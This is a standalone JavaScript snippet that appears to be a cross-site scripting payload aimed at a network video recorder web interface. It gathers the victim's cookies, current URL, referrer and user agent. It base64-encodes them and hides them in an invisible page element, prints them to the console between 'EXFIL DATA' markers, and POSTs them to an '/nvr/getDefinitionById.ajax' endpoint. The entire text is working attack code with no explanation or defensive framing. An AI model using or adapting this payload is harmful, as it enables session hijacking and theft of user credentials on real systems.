(function() {
    'use strict';
    
    var payload = {
        cookie: document.cookie,
        url: location.href,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
    };
    
    var div = document.createElement('div');
    div.id = 'exfil-data';
    div.style.display = 'none';
    div.textContent = btoa(JSON.stringify(payload));
    document.body.appendChild(div);
    
    console.log('[EXFIL DATA START]');
    console.log(btoa(JSON.stringify(payload)));
    console.log('[EXFIL DATA END]');
    
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/nvr/getDefinitionById.ajax', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('exfil_data_' + btoa(JSON.stringify(payload)) + '=1');
    } catch(e) {}
    
    console.log('[*] Data stored in DOM and console');
})();
